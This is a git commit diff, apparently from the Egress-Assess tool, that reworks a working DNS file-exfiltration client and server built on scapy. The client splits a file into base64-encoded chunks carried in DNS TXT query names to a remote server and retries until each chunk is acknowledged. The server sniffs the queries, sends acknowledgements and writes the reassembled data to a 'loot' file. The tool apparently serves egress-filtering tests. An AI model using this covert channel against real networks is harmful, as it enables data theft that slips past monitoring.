0a3877b637c7aa146893c65dbc0caed40a4bbe6e
Christopher Truncer <CTruncer@christophertruncer.com>
2015-05-07 09:20:17 -0400

    Working dns file transfer

--- protocols/clients/dns_client.py
+++ protocols/clients/dns_client.py
@@ -7,7 +7,6 @@ http://blog.cobaltstrike.com/2013/06/20/thatll-never-work-we-dont-allow-port-53-
 '''
 
 import base64
-import re
 import socket
 import sys
 from common import helpers
@@ -23,7 +22,7 @@ class Client:
             self.file_transfer = False
             self.length = 35
         else:
-            self.length = 14
+            self.length = 10
             if "/" in cli_object.file:
                 self.file_transfer = cli_object.file.split("/")[-1]
             else:
@@ -41,28 +40,36 @@ class Client:
             print "[*] Resolving IP of domain..."
             final_destination = socket.gethostbyname(self.remote_server)
 
-        while (byte_reader < len(data_to_transmit) + self.length):
+        # calcalate total packets
+        if ((len(data_to_transmit) % self.length) == 0):
+            total_packets = len(data_to_transmit) / self.length
+        else:
+            total_packets = (len(data_to_transmit) / self.length) + 1
+
+        while (byte_reader < len(data_to_transmit)):
             if not self.file_transfer:
                 encoded_data = base64.b64encode(data_to_transmit[byte_reader:byte_reader + self.length])
             else:
                 encoded_data = base64.b64encode(self.file_transfer +
-                    ".:::-989-:::." + data_to_transmit[byte_reader:byte_reader + self.length])
-
-            # calcalate total packets
-            if ((len(data_to_transmit) % self.length) == 0):
-                total_packets = len(data_to_transmit) / self.length
-            else:
-                total_packets = (len(data_to_transmit) / self.length) + 1
+                    ".:|:." + str(packet_number) + "/" + str(total_packets) + ".:|:." + data_to_transmit[byte_reader:byte_reader + self.length])
 
             print "[*] Packet Number/Total Packets:        " + str(packet_number) + "/" + str(total_packets)
 
             # Craft the packet with scapy
             try:
-                send(IP(dst=final_destination)/UDP()/DNS(
-                    id=15, opcode=0,
-                    qd=[DNSQR(qname="egress-assess.com", qtype="TXT")], aa=1, qr=0,
-                    an=[DNSRR(rrname=encoded_data, type="TXT", ttl=10)]),
-                    verbose=False)
+                while True:
+
+                    response_packet = sr1(IP(dst=final_destination)/UDP()/DNS(
+                        id=15, opcode=0,
+                        qd=[DNSQR(qname=encoded_data, qtype="TXT")], aa=1, qr=0),
+                        verbose=False, timeout=2)
+
+                    if response_packet:
+                        if response_packet.haslayer(DNSRR):
+                            dnsrr_strings = repr(response_packet[DNSRR])
+                            if str(packet_number) + "allgoodhere" in dnsrr_strings:
+                                break
+
             except KeyboardInterrupt:
                 print "[*] Shutting down..."
                 sys.exit()
@@ -70,5 +77,14 @@ class Client:
             # Increment counters
             byte_reader += self.length
             packet_number += 1
+
+        while True:
+            final_packet = sr1(IP(dst=final_destination)/UDP()/DNS(
+                id=15, opcode=0,
+                qd=[DNSQR(qname="ENDTHISFILETRANSMISSIONEGRESSASSESS", qtype="TXT")], aa=1, qr=0),
+                verbose=True, timeout=2)
+
+            if final_packet:
+                break
 
         return
--- protocols/servers/dns_server.py
+++ protocols/servers/dns_server.py
@@ -19,29 +19,53 @@ class Server:
         self.last_packet = ''
         self.file_name = ''
         self.loot_path = ''
+        self.file_dict = {}
+        self.total_packets = ''
 
     def customAction(self, packet):
 
-        if packet.haslayer(DNSRR):
-            dnsrr_strings = repr(packet[DNSRR])
+        if packet.haslayer(DNSQR):
+            print "got packet"
+            dnsqr_strings = repr(packet[DNSQR])
             try:
-                incoming_data = base64.b64decode(dnsrr_strings.split('\'')[1].rstrip('.'))
-                if incoming_data == self.last_packet:
+                incoming_data = base64.b64decode(dnsqr_strings.split('\'')[1].rstrip('.'))
+                self.file_name = incoming_data.split(".:|:.")[0]
+                file_status = incoming_data.split(".:|:.")[1]
+                file_data = incoming_data.split(".:|:.")[2]
+                self.total_packets = file_status.split('/')[1]
+                if file_status.split('/')[0] in self.file_dict:
                     pass
                 else:
-                    if ".:::-989-:::." in incoming_data:
-                        file_name = incoming_data.split(".:::-989-:::.")[0]
-                        file_data = incoming_data.split(".:::-989-:::.")[1]
-                        with open(self.loot_path + file_name, 'a') as\
-                                dns_out:
-                            dns_out.write(file_data)
-                        self.last_packet = incoming_data
+                    if ".:|:." in incoming_data:
+                        self.file_dict[file_status.split('/')[0]] = file_data
+
+                        outgoing_data = file_status.split('/')[0] + "allgoodhere"
+
+                        # This function from http://bb.secdev.org/scapy/issue/500/les-r-ponses-dns-de-type-txt-sont-malform
+                        for i in range(0, len(outgoing_data), 0xff+1):
+                            outgoing_data = outgoing_data[:i] + chr(len(outgoing_data[i:i+0xff])) + outgoing_data[i:]
+
+                        send(IP(dst=packet[IP].src)/UDP(dport=packet[UDP].sport, sport=53)/DNS(id=packet[DNS].id, qr=1,
+                            qd=[DNSQR(qname=dnsqr_strings.split('\'')[1].rstrip('.'), qtype=packet[DNSQR].qtype)],
+                            an=[DNSRR(rrname=dnsqr_strings.split('\'')[1].rstrip('.'), rdata=outgoing_data, type=packet[DNSQR].qtype)]),
+                            verbose=False)
+                        print "sent response packet"
+
                     else:
                         with open(self.loot_path + self.file_name, 'a') as dns_out:
                             dns_out.write(incoming_data)
                         self.last_packet = incoming_data
             except TypeError:
-                pass
+                if "ENDTHISFILETRANSMISSIONEGRESSASSESS" in dnsqr_strings:
+                    print len(self.file_dict)
+                    print str(self.total_packets)
+                    with open(self.loot_path + self.file_name, 'a') as\
+                            dns_out:
+                        for dict_key in xrange(1, int(self.total_packets) + 1):
+                            if str(dict_key) == '982':
+                                print self.file_dict[str(dict_key)]
+                            dns_out.write(self.file_dict[str(dict_key)])
+                    sys.exit()
         return
 
     def serve(self):
@@ -59,5 +83,5 @@ class Server:
             "_" + current_time.replace(":", "") + "text_data.txt"
 
         print "[*] DNS server started!"
-        sniff(prn=self.customAction)
+        sniff(prn=self.customAction, store=0)
         return
